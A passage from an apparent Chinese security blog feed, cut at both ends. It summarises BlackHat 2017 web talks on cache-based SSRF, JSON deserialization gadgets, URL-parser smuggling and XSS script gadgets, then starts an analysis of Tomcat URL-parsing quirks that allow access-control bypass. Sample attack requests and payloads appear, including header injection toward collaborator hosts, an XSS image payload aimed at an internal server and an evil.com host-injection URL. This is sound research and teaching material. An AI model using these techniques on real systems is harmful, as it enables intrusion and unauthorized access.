a.burpcollaborator.net</span><br><span class="line">True-Client-IP: b.burpcollaborator.net</span><br><span class="line">Referer: http://c.burpcollaborator.net/</span><br><span class="line">X-WAP-Profile: http://d.burpcollaborator.net/wap.xml</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>具体几个头字段的利用看作者博客即可。</p><h4 id="Pre-emptive-caching"><a href="#Pre-emptive-caching" class="headerlink" title="Pre-emptive caching"></a>Pre-emptive caching</h4><p>预缓存。</p><p>看个将反射型XSS提升至SSRF的案例。一个军方的服务器有预缓存的行为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: burpcollaborator.net</span><br></pre></td></tr></table></figure><p>随后收到如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /jquery.js HTTP/1.1</span><br><span class="line">GET /abrams.jpg HTTP/1.1</span><br></pre></td></tr></table></figure><p>缓存服务器收到<code>&lt;img src=&quot;/a.jpg&quot;/&gt;</code>这样的内容时，会拿Host头发出这样的请求来预加载资源：<code>http://burpcollaborator.net/a.jpg</code></p><p>作者在后端应用中找到一个反射型XSS，注入一段访问内网服务器上的图片的语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /xss.cgi HTTP/1.1</span><br><span class="line">Content-Length: 103</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">xss=&lt;img src=&quot;http://internal-server.mil/index.php/fake.jpg&quot;/&gt;</span><br></pre></td></tr></table></figure><p>然后缓存服务器将缓存它并可从外网访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/fake.jpg</span><br><span class="line">Host: internal-server.mil</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>整个攻击过程如图：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/11.png" alt=""></p><h2 id="0x03-JSON-ATTACKS"><a href="#0x03-JSON-ATTACKS" class="headerlink" title="0x03 JSON ATTACKS"></a>0x03 JSON ATTACKS</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></p><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>本次议题讲的就是JSON库反序列化漏洞及其Gadgets的内容。其中包括Fastjson、Jackson等反序列化漏洞的研究，基本原理这些这里不再赘述，只对一些JSON反序列化Tips进行记录即可。</p><p>JSON如果只传递简单对象，一般是安全的。但是如果传递的是Java对象或者.NET对象，则会容易存在安全问题。</p><p>Java反序列化和.NET BinaryFormat反序列化容易被攻击，这是因为它们在处理过程中会调用一系列的回调函数，而这些回调函数如果存在危险调用或操作则就造成了反序列化漏洞的存在。<strong>整个攻击可归结为攻击者能够控制反序列化对象图中的对象类型，而该类型的反序列化回调逻辑可以被利用来执行任意代码。</strong></p><p>反序列化对象图，类似于HTML页面的DOM树，DOM树包含一系列的标签，标签间有层次关系。要反序列化的对象可能继承于某个类型、可以有多种类型的成员变量，这些被包含的对象又有类型的结构，展开就像DOM树一样也是一张图，被称为对象图。</p><p>反序列化攻击中，攻击者要能控制对象图中某个对象，注入Gadgets类型来实现攻击。而Gadgets类型就是在其反序列化回调过程中可以注入恶意代码并被执行的类，比如JDK的TemplatesImpl类。因此，<strong>反序列化漏洞研究的思路可以归结为两点：如何控制对象类型和寻找Gadgets类型</strong>。</p><h3 id="JSON反序列化过程"><a href="#JSON反序列化过程" class="headerlink" title="JSON反序列化过程"></a>JSON反序列化过程</h3><p>JSON反序列化就是JSON unmarshaller根据JSON数据（字符串）重新构造出对象（Object）。</p><p>其中，最常见的几种实现方法如下：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/13.png" alt=""></p><h4 id="通过默认构造函数与反射实现"><a href="#通过默认构造函数与反射实现" class="headerlink" title="通过默认构造函数与反射实现"></a>通过默认构造函数与反射实现</h4><p>Java的JSON-IO库、经典的.NET deserializer（当反序列化类型有@Serializable注解但没有实现ISerializable接口）。这些JSON反序列化过程会调用一些函数，而如果这些函数中存在危险操作则存在反序列化漏洞的风险：</p><ul><li>析构函数，如Finalize()，对象被垃圾回收时触发；</li><li>一些类型不能通过反射来构建，例如.NET的Hashtable，hash值需要重新计算，因此很多方法如HashCode()、Equal()、Compare()等可能被调用；</li><li>其他可能调用到的方法，如异常处理器调用toString()；</li></ul><h4 id="通过默认构造函数与setters实现"><a href="#通过默认构造函数与setters实现" class="headerlink" title="通过默认构造函数与setters实现"></a>通过默认构造函数与setters实现</h4><p>与前一个方法类似，但不使用反射，而使用property/field的set方法（setters）来操作对象的fields。</p><p>通常这样的反序列化器只处理public的property/field，比前一个方法限制多一些。尽管如此，大部分的反序列化器使用这种方案。但是，某些情况下，反序列化器会通过反射调用private setter。</p><p>因为标准库和三方库中普遍存在自定义setter，因此Gadgets类型的范围非常广，这也是为啥Jackson和Fastjson不断爆出新的绕过黑名单的Gadgets CVE的原因（通过对Fastjson和Jackson的分析，这些库对于Map、Collection类型的数据支持通过getter方法设置值，等同于setter）。</p><h4 id="通过特殊构造函数-类型转换器-回调函数实现"><a href="#通过特殊构造函数-类型转换器-回调函数实现" class="headerlink" title="通过特殊构造函数/类型转换器/回调函数实现"></a>通过特殊构造函数/类型转换器/回调函数实现</h4><p>Java和.NET的反序列化回调方法，比如Json.NET的OnError属性，Java的readObject()，.NET中ISerializable的特殊构造函数，.NET中OnDeserialized和OnDeserializing注解的方法，XmlSerializer中IXmlSerializable的ReadXml()等。</p><p>JSON库的反序列化器提供注解的反序列化回调函数的情况很少见，一些库会调用到Java/.NET的反序列化回调。</p><p><strong>由此可见，JSON反序列化过程没有调用Object deserialization（Java原生反序列化）的callbacks，因此Java反序列化的Gadgets类型大多数对JSON反序列化是没用的。</strong></p><p>当然，也有个别方法在JSON反序列化过程中被调用，可以根据此启动Gadget链：</p><ul><li>Non-default constructor</li><li>Setters</li><li>Type Converters（.NET特有）</li></ul><p>作者发现大多数JSON库都调用setter方法来处理对象成员，因此关注点应该放在那些会导致任意代码执行的setter方法中（大多数Gadget类型的特性）。</p><p><strong>JSON库判断field是否存在、如何确定setter方法，不同的库有各自的实现，这两点如果处理不好就导致漏洞的存在，同时这两点也是分析反序列化新Gadget的重点。</strong></p><h3 id="RCE-Gadgets"><a href="#RCE-Gadgets" class="headerlink" title="RCE Gadgets"></a>RCE Gadgets</h3><p>作者提及的几个Gadgets。</p><p>注意：JDK8u121默认禁止了通过JNDI对象Factory来加载远程Class，但不影响LDAP的利用方式。具体参考JNDI注入的文章。</p><h4 id="org-hibernate-jmx-StatisticsService"><a href="#org-hibernate-jmx-StatisticsService" class="headerlink" title="org.hibernate.jmx.StatisticsService"></a>org.hibernate.jmx.StatisticsService</h4><p>setSessionFactoryJNDIName() -&gt; JNDI lookup    </p><h4 id="com-atomikos-icatch-jta-RemoteClientUserTransaction"><a href="#com-atomikos-icatch-jta-RemoteClientUserTransaction" class="headerlink" title="com.atomikos.icatch.jta.RemoteClientUserTransaction"></a>com.atomikos.icatch.jta.RemoteClientUserTransaction</h4><p>toString() -&gt; JNDI lookup    </p><h4 id="com-sun-rowset-JdbcRowSetImpl"><a href="#com-sun-rowset-JdbcRowSetImpl" class="headerlink" title="com.sun.rowset.JdbcRowSetImpl"></a>com.sun.rowset.JdbcRowSetImpl</h4><p>setAutoCommit() -&gt; JNDI lookup，JDK自带</p><h4 id="org-antlr-stringtemplate-StringTemplate"><a href="#org-antlr-stringtemplate-StringTemplate" class="headerlink" title="org.antlr.stringtemplate.StringTemplate"></a>org.antlr.stringtemplate.StringTemplate</h4><p>toString()，可以被利用来和其他Gadget类形成Gadget利用链，比如TemplatesImpl.getOutputProperties() </p><h3 id="各种JSON库的安全性与漏洞模式"><a href="#各种JSON库的安全性与漏洞模式" class="headerlink" title="各种JSON库的安全性与漏洞模式"></a>各种JSON库的安全性与漏洞模式</h3><p>Default：默认支持类型指定；Configuration：通过配置可支持类型指定。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/14.png" alt=""></p><h4 id="Jackson"><a href="#Jackson" class="headerlink" title="Jackson"></a>Jackson</h4><p>通过ObjectMapper.enableDefaultTyping()全局使能动态类型指定（当然还有注解的方式即<code>@JsontypeInfo</code>），并且支持通过参数限定哪些类型的成员变量支持动态类型，包括：</p><ul><li>JAVA_LANG_OBJECT：仅影响Object.class类型的属性；</li><li>OBJECT_AND_NON_CONCRETE：影响Object.class和所有non-concrete类型（抽象类、接口等）；</li><li>NON_CONCRETE_AND_ARRAYS：同时，另加所有数组类型（元素均为Object.class和所有non-concrete类型）；</li><li>NON_FINAL：影响所有不声明为final的类型，以及元素中为non_final类型的数组；</li></ul><p><strong>Jackson反序列化过程中会调用被反序列化类的setter方法，并没有进行任何的类型检查。</strong></p><h4 id="Genson"><a href="#Genson" class="headerlink" title="Genson"></a>Genson</h4><p>通过useRuntimeType()开关使能动态类型绑定，这点和Jackson的enableDefaultTyping()类似。</p><p>Genson有对象图的类型检查，因此要实现RCE需要在反序列化的类型中找到入口点。</p><p><strong>同样，Genson反序列化过程中会调用被反序列化类的setter方法。</strong></p><h4 id="JSON-IO"><a href="#JSON-IO" class="headerlink" title="JSON-IO"></a>JSON-IO</h4><p>JSON-IO的反序列化：</p><ul><li>调用反射设置值，不调用setter方法；</li><li>反序列化过程中出现异常时会调用待反序列化的类的toString()方法；</li></ul><p>攻击者可以故意在某个成员的赋值时触发异常，在toString()函数中注入恶意代码实现攻击。</p><h4 id="FlexSON"><a href="#FlexSON" class="headerlink" title="FlexSON"></a>FlexSON</h4><p>默认配置下就支持动态类型的反序列化，并且没有类型检查。</p><p><strong>同样，FlexSON反序列化过程中会调用被反序列化类的setter方法。</strong></p><h3 id="对类型检查防御的Bypass思路"><a href="#对类型检查防御的Bypass思路" class="headerlink" title="对类型检查防御的Bypass思路"></a>对类型检查防御的Bypass思路</h3><p>一些库做类型检查的方式是探测（inspect）将要反序列化的类型的对象图（得到其所有field及其类型），仅允许与成员变量的类型匹配（assignable）的赋值。</p><p><strong>此时若想实现RCE，需要找到对象图上的一个入口点，这个点仍能指定为Gadget类型。</strong></p><p>比如：</p><ul><li>若对象图中有成员变量是java.lang.Object类型或者泛型类型（如<code>Message&lt;T&gt;</code>），那么可以将其当做入口点；</li><li>若对象图中有成员变量的类型是T，T的子类中有成员变量是Object类型。比如java.lang.Exception的子类javax.management.InvalidApplicationException；</li></ul><p>注意：Jackson、Fastjson是使用黑名单禁止反序列化Gadgets类的，这种只能通过新Gadget来Bypass。</p><h2 id="0x04-A-NEW-ERA-OF-SSRF-EXPLOITING-URL-PARSER-IN-TRENDING-PROGRAMMING-LANGUAGES-（利用URL解析器进行SSRF攻击）"><a href="#0x04-A-NEW-ERA-OF-SSRF-EXPLOITING-URL-PARSER-IN-TRENDING-PROGRAMMING-LANGUAGES-（利用URL解析器进行SSRF攻击）" class="headerlink" title="0x04 A NEW ERA OF SSRF - EXPLOITING URL PARSER IN TRENDING PROGRAMMING LANGUAGES!（利用URL解析器进行SSRF攻击）"></a>0x04 A NEW ERA OF SSRF - EXPLOITING URL PARSER IN TRENDING PROGRAMMING LANGUAGES!（利用URL解析器进行SSRF攻击）</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a></p><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>议题的重点是Protocol Smuggling，主要是HTTP请求走私。</p><p>作者展示了Python、PHP、Curl中各个Library对特殊形式HTTP请求处理的差异，并利用这些差异实现SSRF。</p><p>出现该问题的原因在于，HTTP URI的标准有处理建议，但并非强制要求，并且对不符合标准结构的特殊情况没有规定如何处理，因此不同的库都会有自己的实现方式。</p><p>因此，协议走私可以简单理解为二义性问题，即特殊形式的请求报文在不同的解析器下有不同的理解，这种差异结果可被攻击者利用来绕过安全检查或者实现某种攻击如SSRF等。</p><h3 id="基本概念与原理"><a href="#基本概念与原理" class="headerlink" title="基本概念与原理"></a>基本概念与原理</h3><p>作者对于本议题的研究灵感来源于<code>CVE-2016-8624：invalid URL parsing with &#39;#&#39;</code>。</p><p>作者对所有语言的Library进行了测试，各个库的处理情况如下：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/15.png" alt=""></p><p>注意：Port注入类似<code>http://127.0.0.1:12345:80</code>；Host注入类似<code>http://a.com#@evil.com</code>；Path注入类似<code>http://a.com/test/../info</code>等。</p><p>利用这种解析的二义性，就能进行如SSRF的攻击。</p><h3 id="技术点"><a href="#技术点" class="headerlink" title="技术点"></a>技术点</h3><h4 id="SNI注入"><a href="#SNI注入" class="headerlink" title="SNI注入"></a>SNI注入</h4><p>SNI（Server Name Indication，服务器名称指示）定义在RFC 4366，是一项用于改善SSL/TLS的技术，在SSLv3/TLSv1中被启用。它允许客户端发起SSL握手请求时（具体说是客户端发出SSL请求中的ClientHello阶段）就提交请求的Host信息，使得服务器能够切换到正确的域并返回对应的证书。</p><p>注意：SNI是明文传输。</p><p>因此，HTTPS的SNI存在Host头一样的走私方法，如下图CRLF注入：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/17.png" alt=""></p><h4 id="Node-JS"><a href="#Node-JS" class="headerlink" title="Node.JS"></a>Node.JS</h4><p>大写N（U+FF2E）的宽字节形式可以代替<code>..</code>使用。</p><p>Unicode字符<code>U+FF0D U+FF0A</code>可以作为CRLF字符使用。</p><h4 id="glibc-NSS特性"><a href="#glibc-NSS特性" class="headerlink" title="glibc NSS特性"></a>glibc NSS特性</h4><p>gethostbyname()支持十进制数表示Hsot。</p><p>Linux getaddrinfo()会忽略Host中空格之后的内容，很多库的实现依赖该函数，而有些库会进行两次URL解码。</p><p>HTTPConnection.puthreader()禁止CRLF后面的空白，但可以在前面加上空白来绕过。这可以绕过Python CVE-2016-5699补丁的限制。</p><h4 id="遵循的标准不同"><a href="#遵循的标准不同" class="headerlink" title="遵循的标准不同"></a>遵循的标准不同</h4><p>URL parser和URL requester遵循的IDNA标准不同时也会导致解析差异。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/16.png" alt=""></p><h2 id="0x05-DON’T-TRUST-THE-DOM-BYPASSING-XSS-MITIGATIONS-VIA-SCRIPT-GADGETS（利用Script-Gadgets绕过XSS缓解措施）"><a href="#0x05-DON’T-TRUST-THE-DOM-BYPASSING-XSS-MITIGATIONS-VIA-SCRIPT-GADGETS（利用Script-Gadgets绕过XSS缓解措施）" class="headerlink" title="0x05 DON’T TRUST THE DOM: BYPASSING XSS MITIGATIONS VIA SCRIPT GADGETS（利用Script Gadgets绕过XSS缓解措施）"></a>0x05 DON’T TRUST THE DOM: BYPASSING XSS MITIGATIONS VIA SCRIPT GADGETS（利用Script Gadgets绕过XSS缓解措施）</h2><p>PDF：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p><h3 id="基本概念与原理-1"><a href="#基本概念与原理-1" class="headerlink" title="基本概念与原理"></a>基本概念与原理</h3><p>XSS Mitigation即XSS缓解措施，该机制是通过识别并阻止恶意的标签或属性来缓解XSS攻击。常见的XSS MITIGATIONS机制有浏览器的CSP机制、XSS Auditor、XSS Filter、WAF的过滤器等。</p><p>当今Web应用都普遍使用JavaScript框架，而JavaScript框架通常是用到了DOM操纵技术，即从DOM中读取数据、修改DOM的结构等。在实现上是使用selector（选择器），通过某种形式的语法来选取DOM中特定的单个或多个标签，来读写器属性或文本。</p><p>那么是否可以通过JS框架的script来绕过XSS Mitigation机制呢？——使用Script Gadget来绕过。</p><p>什么是Script Gadget？——简单地说，Script Gadget就是在当前页面中可被利用来绕过XSS Mitigation机制的JS代码。</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/19.png" alt=""></p><p>页面上通过selector读取标签属性的JS脚本片段，使用了会导致脚本执行的API（比如上图的html()）来处理读取的数据。这里注入的XSS数据时一段HTML代码，没有script和on事件等恶意标签或属性，恶意脚本藏在data-text的值中，且该值不受XSS Mitigation机制的限制；当经过正文JS脚本中selector的处理后，data-text的值就被放入buttons.html() API中使用，进而放入DOM中导致恶意脚本被执行。这整个过程就是使用无害的JS库的API来绕过XSS Mitigation机制的。</p><p>注意：注入的数据经过了HTML编码，但是仍然能够执行XSS，这是因为注入的内容在div标签中，会先被HTML解析器进行HTML解码。</p><p>针对Gadgets的研究，作者做了充分的实验测试，具体的可参考PDF连接文档。</p><p>具体的Script Gadget PoC都在：<a href="https://github.com/google/security-research-pocs" target="_blank" rel="noopener">https://github.com/google/security-research-pocs</a></p><h3 id="研究结论"><a href="#研究结论" class="headerlink" title="研究结论"></a>研究结论</h3><p>除了React库外，其他库都存在Script Gadget可以绕过特定的XSS Mitigation，其中Emberjs仅在开发者版本中存在绕过风险：</p><p><img src="/2020/04/19/BlackHat-2017-Web小结/18.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="BlackHat" scheme="https://www.mi1k7ea.com/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>（先知首发）Tomcat URL解析差异性导致的安全问题</title>
    <link href="https://www.mi1k7ea.com/2020/04/01/Tomcat-URL%E8%A7%A3%E6%9E%90%E5%B7%AE%E5%BC%82%E6%80%A7%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mi1k7ea.com/2020/04/01/Tomcat-URL解析差异性及利用/</id>
    <published>2020-04-01T15:47:17.000Z</published>
    <updated>2020-04-22T15:41:47.477Z</updated>
    
    <content type="html"><![CDATA[<p>先知：<a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a></p><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。</p><p>当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。</p><h2 id="0x02-URL解析差异性"><a href="#0x02-URL解析差异性" class="headerlink" title="0x02 URL解析差异性"></a>0x02 URL解析差异性</h2><h3 id="HttpServletRequest中几个解析URL的函数"><a href="#HttpServletRequest中几个解析URL的函数" class="headerlink" title="HttpServletRequest中几个解析URL的函数"></a>HttpServletRequest中几个解析URL的函数</h3><p>在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数：</p><ul><li>request.getRequestURL()：返回全路径；</li><li>request.getRequestURI()：返回除去Host（域名或IP）部分的路径；</li><li>request.getContextPath()：返回工程名部分，如果工程映射为<code>/</code>，则返回为空；</li><li>request.getServletPath()：返回除去Host和工程名部分的路径；</li><li>request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null；</li></ul><p>网上的一个小结，Servlet的匹配路径为<code>/test%3F/*</code>，并且Web应用是部署在<code>/app</code>下，此时请求的URL为<code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a</code>，各个函数解析如下表：</p><table><thead><tr><th>函数</th><th>URL解码</th><th>解析结构</th></tr></thead><tbody><tr><td>getRequestURL()</td><td>no</td><td><code>http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getRequestURI()</td><td>no</td><td><code>/app/test%3F/a%3F+b;jsessionid=s%3F+ID</code></td></tr><tr><td>getContextPath()</td><td>no</td><td><code>/app</code></td></tr><tr><td>getServletPath()</td><td>yes</td><td><code>/test?</code></td></tr><tr><td>getPathInfo()</td><td>yes</td><td><code>/a?+b</code></td></tr></tbody></table><h3 id="特殊字符的URL解析"><a href="#特殊字符的URL解析" class="headerlink" title="特殊字符的URL解析"></a>特殊字符的URL解析</h3><p>新建一个Java Web项目，index.jsp如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">out.println(<span class="string">"getRequestURL(): "</span> + request.getRequestURL() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getRequestURI(): "</span> + request.getRequestURI() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getContextPath(): "</span> + request.getContextPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getServletPath(): "</span> + request.getServletPath() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">out.println(<span class="string">"getPathInfo(): "</span> + request.getPathInfo() + <span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h4 id="正常访问"><a href="#正常访问" class="headerlink" title="正常访问"></a>正常访问</h4><p>Tomcat运行之后，正常访问<code>http://localhost:8080/urltest/index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/1.png" alt=""></p><h4 id="插入-访问"><a href="#插入-访问" class="headerlink" title="插入 ./ 访问"></a>插入 ./ 访问</h4><p>尝试插入多个<code>./</code>访问即<code>http://localhost:8080/urltest/./././index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/2.png" alt=""></p><p>可以看到，插入多个<code>./</code>也能正常访问。</p><p>接着尝试这种形式<code>http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp</code>，发现是返回404，未找到该资源访问：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/3.png" alt=""></p><h4 id="插入-访问-1"><a href="#插入-访问-1" class="headerlink" title="插入 ../ 访问"></a>插入 ../ 访问</h4><p>尝试插入<code>../</code>访问即<code>http://localhost:8080/urltest/../index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/4.png" alt=""></p><p>可以是返回的404，这是因为实际访问的是<code>http://localhost:8080/index.jsp</code>，这个目录文件当然不存在。</p><p>换种跨目录的形式就OK了<code>http://localhost:8080/urltest/noexist/../index.jsp</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/5.png" alt=""></p><h4 id="插入-访问-2"><a href="#插入-访问-2" class="headerlink" title="插入 ;/ 访问"></a>插入 ;/ 访问</h4><p>尝试插入多个<code>;/</code>访问即<code>http://localhost:8080/urltest/;/;/;/index.jsp</code>，页面输出如下：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/6.png" alt=""></p><p>可以看到，插入多个<code>;</code>也能正常访问。</p><p>在<code>;</code>号后面加上字符串也是能正常访问的，如<code>http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/7.png" alt=""></p><h4 id="插入其他特殊字符访问"><a href="#插入其他特殊字符访问" class="headerlink" title="插入其他特殊字符访问"></a>插入其他特殊字符访问</h4><p>尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">` ~ ! @ # $ % ^ &amp; * ( ) - _ = + [ ] &#123; &#125; \ | : &apos; &quot; &lt; &gt; ?</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>由前面的尝试知道，Tomcat中的URL解析是支持嵌入<code>./</code>、<code>../</code>、<code>;xx/</code>等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。</p><h2 id="0x03-调试分析"><a href="#0x03-调试分析" class="headerlink" title="0x03 调试分析"></a>0x03 调试分析</h2><p>Tomcat会先对请求的URL进行解析处理，提取到一些信息之后才会到调用getRequestURI()等函数的流程。</p><h3 id="Tomcat对URL特殊字符的处理"><a href="#Tomcat对URL特殊字符的处理" class="headerlink" title="Tomcat对URL特殊字符的处理"></a>Tomcat对URL特殊字符的处理</h3><p>这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。</p><p>经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">service:452, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">process:1195, AbstractHttp11Processor (org.apache.coyote.http11)</span><br><span class="line">process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)</span><br><span class="line">run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1142, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:617, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:745, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/8.png" alt=""></p><p>跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/9.png" alt=""></p><p>这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在<code>;</code>号，找到的话才会进入下面的if代码逻辑：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/10.png" alt=""></p><p>如果找到了<code>;</code>号，在if代码逻辑中后面的循环体会将<code>;xxx/</code>中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问<code>http://localhost:8080/urltest/;mi1k7ea/index.jsp</code>再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是<code>;</code>，47是<code>/</code>）：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/11.png" alt=""></p><p>由此可知，parsePathParameters()函数是对<code>;xxx/</code>这种形式进行处理的。</p><p>接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。</p><p>先看到这段代码，ASCII码92表示<code>\</code>，当匹配到时将其替换为ASCII码为47的<code>/</code>；当匹配到ASCII码0即空字符时，直接返回false无法成功解析：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/12.png" alt=""></p><p>往下是这段循环，判断是否有连续的<code>/</code>，存在的话则循环删除掉多余的<code>/</code>：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/13.png" alt=""></p><p>接着往下看，这段循环就是对<code>./</code>和<code>../</code>这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/14.png" alt=""></p><p>这里尝试下添加<code>/./</code>访问的处理，看到找到之后是直接将其去掉然后继续放行：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/15.png" alt=""></p><p>这里尝试下添加<code>/../</code>访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/16.png" alt=""></p><p>由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过<code>;xxx/</code>的URL请求内容进标准化处理，具体为将连续的多个<code>/</code>给删除掉只保留一个、将<code>/./</code>删除掉、将<code>/../</code>进行跨目录拼接处理，最后返回处理后的URL路径。</p><p><strong>结论</strong></p><p>Tomcat对<code>/;xxx/</code>以及<code>/./</code>的处理是包容的、对<code>/../</code>会进行跨目录拼接处理。</p><h3 id="getRequestURI-的处理"><a href="#getRequestURI-的处理" class="headerlink" title="getRequestURI()的处理"></a>getRequestURI()的处理</h3><p>我们直接在index.jsp中调用getRequestURI()函数的地方打上断点调试即可。</p><p>这里是直接调用Request.requestURI()函数然后直接返回其字符串值：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/19.png" alt=""></p><p>跟进Request.requestURI()函数，这里是直接返回请求的URL内容，没有做任何处理以及URL解码：</p><p><img src="/2020/04/01/Tomcat-URL解析差异性及利用/20.png" alt=""></p><h3 id="getRequestURL-的处理"><a 